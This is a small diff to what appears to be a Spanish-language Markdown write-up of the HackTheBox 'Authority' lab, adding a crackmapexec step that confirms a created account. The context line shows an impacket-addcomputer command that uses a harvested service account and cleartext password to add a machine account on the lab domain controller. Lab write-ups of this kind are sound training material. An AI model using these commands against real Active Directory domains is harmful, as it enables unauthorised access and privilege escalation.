@@ -289,3 +289,7 @@ impacket-addcomputer authority.htb/svc_ldap:lDaP_1n_th3_cle4r! -dc-ip 10.10.11.2
 ```
 ![[Pasted image 20240326235443.png]]
 
+### crackmapexec
+verificamos que hemos creado correctamente el usuario y la contraseña 
+![[Pasted image 20240327003629.png]]
+
